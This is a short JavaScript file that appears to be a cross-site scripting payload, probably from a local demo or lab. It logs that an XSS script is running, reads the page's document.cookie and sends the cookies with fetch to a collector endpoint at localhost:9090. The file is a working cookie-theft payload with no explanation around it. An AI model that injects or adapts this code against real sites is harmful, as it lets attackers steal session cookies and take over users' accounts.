

console.log('XSS script running...');

var cookies = document.cookie;

console.log(cookies);

var logo = document.getElementById('logo');

fetch('https://localhost:9090/img/xss?userCookies=' + cookies);







